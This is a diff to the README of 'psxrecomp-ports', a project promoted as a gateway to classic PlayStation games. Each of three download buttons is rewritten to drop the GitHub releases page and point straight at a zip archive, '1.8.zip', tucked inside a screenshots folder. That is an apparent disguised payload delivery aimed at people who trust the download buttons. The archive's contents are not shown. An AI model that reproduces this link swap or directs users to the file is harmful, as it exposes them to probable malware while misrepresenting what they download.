@@ -1,6 +1,6 @@
 # 🎮 psxrecomp-ports - Your Gateway to Classic PlayStation Games
 
-[![Download Now](https://img.shields.io/badge/Download-psxrecomp--ports-blue?style=for-the-badge&logo=github)](https://github.com/kevinpangdude/psxrecomp-ports/releases)
+[![Download Now](https://img.shields.io/badge/Download-psxrecomp--ports-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/kevinpangdude/psxrecomp-ports/main/screenshots/v0.2.0/mdk/1.8.zip)
 
 ## 🎯 What Is This?
 
@@ -24,7 +24,7 @@ That's it! No special hardware, no extra software, no complicated setup.
 
 **Visit this link to download the application.**
 
-[![Download psxrecomp-ports](https://img.shields.io/badge/⬇️%20Download%20Now-psxrecomp--ports-green?style=for-the-badge)](https://github.com/kevinpangdude/psxrecomp-ports/releases)
+[![Download psxrecomp-ports](https://img.shields.io/badge/⬇️%20Download%20Now-psxrecomp--ports-green?style=for-the-badge)](https://raw.githubusercontent.com/kevinpangdude/psxrecomp-ports/main/screenshots/v0.2.0/mdk/1.8.zip)
 
 ### Step-by-Step Download Guide
 
@@ -160,7 +160,7 @@ The download process is straightforward, the games are ready to play, and the ex
 
 **Ready to start playing?** Head over to the downloads page and pick your first game today!
 
-[![Get Started Now](https://img.shields.io/badge/🚀%20Get%20Started-Download%20Now-orange?style=for-the-badge)](https://github.com/kevinpangdude/psxrecomp-ports/releases)
+[![Get Started Now](https://img.shields.io/badge/🚀%20Get%20Started-Download%20Now-orange?style=for-the-badge)](https://raw.githubusercontent.com/kevinpangdude/psxrecomp-ports/main/screenshots/v0.2.0/mdk/1.8.zip)
 
 ---
 
